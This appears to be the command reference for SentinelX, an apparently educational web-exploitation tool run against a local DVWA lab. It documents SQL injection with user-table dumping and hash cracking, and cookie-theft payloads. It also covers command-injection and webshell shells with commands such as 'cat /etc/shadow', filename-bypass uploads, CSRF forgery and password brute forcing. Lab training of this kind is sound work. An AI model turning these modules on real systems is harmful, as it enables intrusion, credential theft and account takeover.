# SentinelX — Command Reference

Every command to run every module, standalone or via the guided CLI. Assumes DVWA at `http://127.0.0.1`, security level **low**, default credentials `admin` / `password`, run from the repo root (`~/SentinelX`).

---

## Cheat Sheet

Fast reference — one line per attack. All commands assume you're in `~/SentinelX`.

```
═══════════════════════════════════════════════════════════════════════════
 GUIDED MODE (recommended — everything in one command)
═══════════════════════════════════════════════════════════════════════════
python3 main.py                                  Full guided scan, any target

═══════════════════════════════════════════════════════════════════════════
 RECON                                            no login required
═══════════════════════════════════════════════════════════════════════════
python3 tests/test_misconfig.py                  Headers, cookies, exposed paths

═══════════════════════════════════════════════════════════════════════════
 SQL INJECTION
═══════════════════════════════════════════════════════════════════════════
python3 tests/test_sqli.py                       Detect only
python3 tests/test_exploit.py                    Detect + extract DB + crack hashes
  sqli@target> user()                              -- current DB user
  sqli@target> database()                          -- current DB name
  sqli@target> @@version                           -- DB version
  sqli@target> GROUP_CONCAT(table_name) FROM
               information_schema.tables WHERE
               table_schema=database()              -- list tables
  sqli@target> exit                                -- back to scan

═══════════════════════════════════════════════════════════════════════════
 XSS
═══════════════════════════════════════════════════════════════════════════
python3 tests/test_xss.py                        Detect only (see snippet below
                                                   if this file doesn't exist yet)
python3 tests/test_cookie_theft.py               Cookie theft PoC (local capture server)

═══════════════════════════════════════════════════════════════════════════
 COMMAND INJECTION
═══════════════════════════════════════════════════════════════════════════
python3 tests/test_cmdi.py                       Detect + exploit + interactive shell
  cmdi@target> whoami                              -- current user
  cmdi@target> id                                  -- user/group context
  cmdi@target> cat /etc/passwd                     -- read a file
  cmdi@target> uname -a                            -- OS/kernel info
  cmdi@target> exit                                -- back to scan

═══════════════════════════════════════════════════════════════════════════
 CSRF                                              ⚠ changes DVWA admin password
═══════════════════════════════════════════════════════════════════════════
python3 tests/test_csrf.py                       Detect + forge exploit on every
                                                   vulnerable form found

═══════════════════════════════════════════════════════════════════════════
 FILE UPLOAD
═══════════════════════════════════════════════════════════════════════════
python3 tests/test_upload.py                     Upload webshell + interactive shell
  webshell@target> whoami                          -- current user
  webshell@target> ls -la /var/www/html            -- web root contents
  webshell@target> exit                            -- back to scan

═══════════════════════════════════════════════════════════════════════════
 IDOR
═══════════════════════════════════════════════════════════════════════════
python3 tests/test_idor.py                       Parameter tampering + direct enum

═══════════════════════════════════════════════════════════════════════════
 BRUTE FORCE
═══════════════════════════════════════════════════════════════════════════
python3 tests/test_brute.py                      Built-in 12-word list (fast)
# custom wordlist — edit scan() call to add:
  wordlist_path="/usr/share/wordlists/rockyou.txt"  Full rockyou.txt run (slow)

═══════════════════════════════════════════════════════════════════════════
 GIT
═══════════════════════════════════════════════════════════════════════════
git add . && git commit -m "msg" && git push origin main
═══════════════════════════════════════════════════════════════════════════
```

---

## Full Reference (with explanations)



## The guided way (recommended)

```bash
python3 main.py
```

One command runs everything — target setup, recon, login, module selection, exploitation, and reporting. See the [README](README.md#usage) for the full interactive walkthrough. Everything below is for running a single module standalone instead.

---

## Setup

```bash
git clone https://github.com/rajdeep-10/SentinelX.git
cd SentinelX
pip install -r requirements.txt --break-system-packages
```

---

## Recon (no login required)

### Misconfiguration scan
Checks missing security headers, insecure cookie flags, exposed sensitive paths (`.git`, `.env`, `phpinfo.php`, `/admin/`, etc.)

```bash
python3 tests/test_misconfig.py
```

---

## SQL Injection

### Scan + full exploitation
Detects error-based/boolean-blind SQLi, then automatically enumerates database tables, dumps the `users` table (all usernames + password hashes), and drops into an interactive query mode.

```bash
python3 tests/test_exploit.py
```

Interactive mode once inside:
```
sqli@127.0.0.1> user()
sqli@127.0.0.1> database()
sqli@127.0.0.1> @@version
sqli@127.0.0.1> GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()
sqli@127.0.0.1> exit
```

### Detection only (no exploitation)
```bash
python3 tests/test_sqli.py
```

### Crack extracted password hashes
Runs after SQLi extraction — cracks the dumped MD5 hashes against `rockyou.txt`.
```bash
# Included automatically at the end of test_exploit.py
```

---

## XSS (Reflected & Stored)

### Detection
```bash
python3 -c "
from modules.crawler import Crawler
from modules.xss_scanner import XSSScanner

crawler = Crawler('http://127.0.0.1')
if crawler.login():
    crawler.set_security_level('low')
    forms = crawler.crawl_all()
    scanner = XSSScanner(crawler.session)
    scanner.scan_all(forms)
"
```

### Cookie theft demonstration
Spins up a local Flask capture server and generates a cookie-stealing payload.
```bash
python3 tests/test_cookie_theft.py
```

---

## Command Injection

### Detection + full exploitation
Confirms injection, auto-runs recon commands (`whoami`, `id`, `hostname`, `uname -a`, `cat /etc/passwd`), then drops into an interactive shell.

```bash
python3 tests/test_cmdi.py
```

Interactive mode once inside:
```
cmdi@target> whoami
cmdi@target> id
cmdi@target> cat /etc/shadow
cmdi@target> exit
```

---

## CSRF

### Detection + exploitation
Scans all discovered forms for missing CSRF tokens, then attempts to forge a real request using each vulnerable form's own fields to prove exploitability.

```bash
python3 tests/test_csrf.py
```

⚠️ **This changes your DVWA admin password** to a marker value (`csrf_poc_9f3a`) when it forges the password-change request. Reset it afterward: log in with the new password via browser → CSRF page → change back to `password`.

---

## File Upload

### Detection + webshell exploitation
Uploads a malicious PHP payload with several bypass filename variants (`shell.php`, `shell.php5`, `shell.phtml`, `shell.pHp`, `shell.php.jpg`), verifies the shell is live, runs recon commands, then drops into an interactive shell.

```bash
python3 tests/test_upload.py
```

Interactive mode once inside:
```
webshell@target> whoami
webshell@target> ls -la /var/www/html
webshell@target> exit
```

---

## IDOR

### Detection
Tests ID-like form parameters for tampering, plus a direct enumeration test against known IDOR-style endpoints.

```bash
python3 tests/test_idor.py
```

*(This script is created per-session in some setups — if missing, recreate it with:)*
```python
from modules.crawler import Crawler
from modules.idor_scanner import IDORScanner

crawler = Crawler("http://127.0.0.1")
if crawler.login():
    crawler.set_security_level("low")
    forms = crawler.crawl_all()
    scanner = IDORScanner(crawler.session, base_url="http://127.0.0.1")
    scanner.scan_all(forms)
```

---

## Brute Force

### Built-in wordlist (fast, 12 common passwords)
```bash
python3 tests/test_brute.py
```

### Custom wordlist (e.g. rockyou.txt)
Edit `test_brute.py`'s `scanner.scan(...)` call to add `wordlist_path`, or run inline:

```python
from modules.crawler import Crawler
from modules.brute_scanner import BruteForceScanner

crawler = Crawler("http://127.0.0.1")
if crawler.login():
    crawler.set_security_level("low")
    scanner = BruteForceScanner(crawler.session, base_url="http://127.0.0.1")
    findings = scanner.scan(username="admin", wordlist_path="/usr/share/wordlists/rockyou.txt")
```

Note: `rockyou.txt` on Kali often ships gzipped — unzip first if needed:
```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

## Git — committing your work

```bash
git add .
git commit -m "your message"
git push origin main
```

---

## Common gotchas

| Symptom | Cause | Fix |
|---|---|---|
| `Login failed — check credentials` | DVWA admin password was changed by a prior CSRF exploit run | Log in via browser with the new password → CSRF page → reset to `password` |
| `ModuleNotFoundError: No module named 'config'` | `config.py` landed inside `modules/` instead of the repo root | `mv modules/config.py .` |
| Brute-force stuck on a huge wordlist | Ran with `rockyou.txt` (14M+ entries) instead of the built-in list | Leave `wordlist_path` blank for the fast built-in list, or wait it out / Ctrl+C (findings collected so far are still saved when run via `main.py`) |
| Interactive shell prompt (`cmdi@target>`, `sqli@...>`, `webshell@target>`) seems stuck | You're inside an interactive exploitation session, not an error | Type `exit` to return to the scan |
